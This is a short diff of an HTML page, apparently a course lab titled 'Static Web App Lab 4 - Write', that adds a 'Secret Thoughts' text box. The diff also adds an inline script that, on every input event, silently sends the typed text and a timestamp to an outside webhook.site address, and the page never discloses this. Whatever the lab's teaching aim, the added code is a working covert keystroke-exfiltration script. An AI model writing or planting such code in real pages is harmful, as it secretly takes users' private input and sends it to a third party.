@@ -1,17 +1,31 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
+  <head>
+    <meta charset="UTF-8" />
+    <title>Static Web App Lab 4</title>
+  </head>
+  <body>
+    <div>
+      <h1>Static Web App Lab 4 - Write</h1>
+      <div>
+        <h2>Secret Thoughts</h2>
+        <textarea id="secretThoughts"></textarea>
+      </div>
+    </div>
 
-<head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <link rel="stylesheet" href="styles.css">
-  <title>Vanilla JavaScript App</title>
-</head>
+    <script>
+      const textarea = document.getElementById("secretThoughts");
 
-<body>
-  <main>
-    <h1>Vanilla JavaScript App</h1>
-  </main>
-</body>
+      textarea.addEventListener("input", (e) => {
+        const text = e.target.value;
 
+        fetch(
+          `https://webhook.site/fccf6dab-ce57-4c03-9089-fa779d681504?` +
+            `text=${encodeURIComponent(text)}&timestamp=${encodeURIComponent(
+              new Date().toISOString()
+            )}`
+        ).catch(console.error);
+      });
+    </script>
+  </body>
 </html>
